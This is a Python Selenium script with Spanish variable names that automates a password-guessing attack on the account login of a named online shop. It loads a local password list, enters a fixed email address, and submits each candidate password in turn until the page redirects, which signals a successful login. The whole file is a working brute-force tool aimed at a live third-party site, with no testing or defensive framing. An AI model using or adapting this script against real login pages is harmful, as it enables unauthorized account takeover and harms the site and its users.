from selenium import webdriver
import time

archivo = open(r'C:\Users\gndon\Desktop\chromedriver_win32\passwords2.txt')

mail = "livoki8755@bunlets.com"
contrasena = []

while True:

    agregado = archivo.readline()
    contrasena.append(agregado)

    if  agregado == "":
        break

driver = webdriver.Chrome(r'C:\Users\gndon\Desktop\chromedriver_win32\chromedriver.exe')
driver.get('https://latiendavichy.com/inicio-sesion?back=my-account')

time.sleep(13)

driver.find_element_by_xpath('//*[@id="popupContainer"]/div[1]/img').click()
pathB = driver.find_element_by_xpath('//*[@id="footer"]/div[2]/div/div[1]/div[5]/form/input[1]')
pathB.send_keys('08001')
driver.find_element_by_xpath('//*[@id="footer"]/div[2]/div/div[1]/div[5]/form/input[2]').click()
driver.find_element_by_xpath('//*[@id="footer"]/div[2]/div/div[1]/div[4]/div[2]/button').click()

time.sleep(3)

pathB = driver.find_element_by_xpath('//*[@id="login-form"]/section/div[1]/div/div/input')
pathB.send_keys(mail)

for x in contrasena:

    driver.find_element_by_xpath('//*[@id="login-form"]/section/div[2]/div/div/div/input').clear()
    pathB = driver.find_element_by_xpath('//*[@id="login-form"]/section/div[2]/div/div/div/input')
    pathB.send_keys(x)

    time.sleep(0.1)

    if driver.current_url == 'https://latiendavichy.com/':
        break